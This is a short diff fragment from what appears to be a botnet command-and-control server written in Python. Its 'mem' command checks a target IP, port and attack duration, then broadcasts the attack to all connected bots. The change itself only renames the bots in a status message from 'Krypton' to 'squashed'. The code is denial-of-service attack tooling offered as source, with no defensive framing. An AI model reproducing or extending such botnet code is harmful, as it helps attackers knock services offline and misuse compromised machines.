@@ -17,7 +17,7 @@ def mem(args, validate_ip, validate_port, validate_time, send, client, ansi_clea
                 if validate_time(secs):
                     for x in xxxx.split('\n'):
                         send(client, '\x1b[3;31;40m'+ x)
-                    send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all Krypton Bots!\n")
+                    send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all squashed Bots!\n")
                     broadcast(data)
                 else:
                     send(client, Fore.RED + '\nInvalid attack duration (10-1300 seconds)\n')
